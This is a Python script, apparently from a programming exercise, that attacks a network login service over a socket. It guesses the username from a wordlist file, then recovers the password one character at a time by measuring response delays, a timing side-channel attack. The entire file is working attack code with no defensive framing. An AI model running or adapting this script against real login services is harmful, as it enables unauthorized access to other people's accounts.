import socket
import sys
import json
import string
import time


def establish_connection(client_socket):
    args = sys.argv
    ip_address, port = args[1], args[2]
    client_socket.connect((ip_address, int(port)))


def send_receive(client_socket, buff_size, data):
    client_socket.send(json.dumps(data).encode())
    start = time.perf_counter()
    response = json.loads(client_socket.recv(buff_size).decode())
    end = time.perf_counter()
    delay = end - start
    return response, delay


def guessing_login(client_socket, data, buff_size):
    with open("logins.txt", "r") as file:
        for line in file:
            data["login"] = line.rstrip('\n')
            response, delay = send_receive(client_socket, buff_size, data)
            if response == {"result": "Wrong password!"}:
                return data


def guessing_password(client_socket, data, buff_size):
    symbols = string.ascii_letters + string.digits
    while True:
        for symbol in symbols:
            data["password"] += symbol
            response, delay = send_receive(client_socket, buff_size, data)
            max_delay = 0.1
            if response == {"result": "Wrong password!"} and delay < max_delay:
                data["password"] = data["password"][:-1]
            elif response == {"result": "Wrong password!"} and delay > max_delay:
                continue
            elif response == {"result": "Connection success!"}:
                return data


def main():
    buff_size = 1024
    data = {"login": '', "password": ''}
    with socket.socket() as client_socket:
        establish_connection(client_socket)
        guessing_login(client_socket, data, buff_size)
        guessing_password(client_socket, data, buff_size)
        print(json.dumps(data))
        client_socket.close()


if __name__ == "__main__":
    main()
